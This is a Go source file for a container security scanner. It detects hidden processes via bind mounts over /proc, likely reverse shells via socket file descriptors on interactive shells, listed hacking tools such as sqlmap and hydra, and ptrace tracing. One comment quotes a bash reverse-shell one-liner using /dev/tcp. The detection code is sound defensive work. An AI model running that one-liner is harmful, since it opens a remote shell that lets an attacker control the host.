package security

import (
	"fmt"
	"io"
	"os"
	"regexp"
	"strings"

	api "github.com/chaitin/libveinmind/go"
)

// 进程安全检查能力
var (
	shList   = []string{"bash", "zsh", "sh", "csh", "ksh", "tcsh", "fish", "ash"}
	hackList = []string{"minerd", "r00t", "sqlmap", "nmap", "hydra", "fscan", "cdk"}
)

func IsHideProcess(fs api.FileSystem) (bool, string) {
	// 隐藏进程检测
	// 隐藏进程的几种方法：
	// 1. 劫持readdir系统调用
	// 说白了就是通过so动态链接库来实现`ps -ef`无法看到恶意进程但是实际执行了恶意代码。
	// 这个的检测交给了后门来做
	// 2. mount 挂载
	// 原理在于通过·mount -o bind·覆盖了进程目录
	// 3. 内核态检测，如rootkit，这个也算做了后门的检测范畴内。
	// 此处检测逻辑为规则2的检测。
	path := "/proc/mounts"
	if _, err := fs.Stat(path); err == nil {
		file, err := fs.Open(path)
		if err != nil {
			return false, ""
		}
		content, err := io.ReadAll(file)
		if err != nil {
			return false, ""
		}
		return hasMount(string(content))
	}
	return false, ""
}

func IsReverseShell(fs api.FileSystem, pid int32, cmdline string) bool {
	// 正则是一个懒惰且愚蠢的方式
	// 理论依据来源：https://help.aliyun.com/document_detail/206139.html
	// 本方法按照分层检测理论思想，实现了除网络通信层之外的检测逻辑
	// 1. 重定向检测
	// 经典 `bash -i >& /dev/tcp/10.10.XX.XX/666 0>&1`
	// 这个规则我们检测/proc/xxxxx/fd 下的输出文件是否是一个socket链接
	for _, sh := range shList {
		if strings.Contains(cmdline, sh) && strings.Contains(cmdline, "-i") {
			// let's check
			if ok, err := isSocket(fs, pid); ok && err == nil {
				// this means /proc/xxxx/fd exits Unix domain socket, maybe a reverse shell
				return true
			}
		}
	}

	// 2. 管道符、伪终端检测
	// todo
	// 3. 标准语言输入转重定向
	// todo
	return false
}

func IsEval(cmdline string) bool {
	cmdList := strings.Split(cmdline, " ")
	for _, cmd := range cmdList {
		for _, hack := range hackList {
			if cmd == hack || strings.HasPrefix(cmd, hack) {
				return true
			}
		}
	}
	return false
}

func HasPtraceProcess(content string) bool {
	if ok, err := regexp.MatchString(`TracerPid:\s+0`, content); !ok && err == nil && strings.Contains(content, "TracerPid") {
		fmt.Println(content)
		return true
	}
	return false
}

func hasMount(content string) (bool, string) {
	lines := strings.Split(content, "\n")
	for _, line := range lines {
		row := strings.Split(line, " ")

		if len(row) > 2 {
			if ok, err := regexp.MatchString(`/proc/\d+`, row[1]); ok && err == nil {
				return true, row[1]
			}
		}
	}
	return false, ""
}

func isSocket(fs api.FileSystem, pid int32) (bool, error) {
	// check
	fdDir := fmt.Sprintf("/proc/%d/fd", pid)
	dir, err := fs.Open(fdDir)
	if err != nil {
		// todo: log error
	}
	defer dir.Close()

	// 检查文件描述符0、1、2
	for _, fd := range []uint64{0, 1, 2} {
		// 获取文件描述符的链接信息
		fdInfo, err := fs.Stat(fmt.Sprintf("%s/%d", fdDir, fd))
		if err != nil {
			return false, err
		}
		fileMode := fdInfo.Mode()

		return fileMode&os.ModeSocket == os.ModeSocket, nil
	}
	return false, nil
}
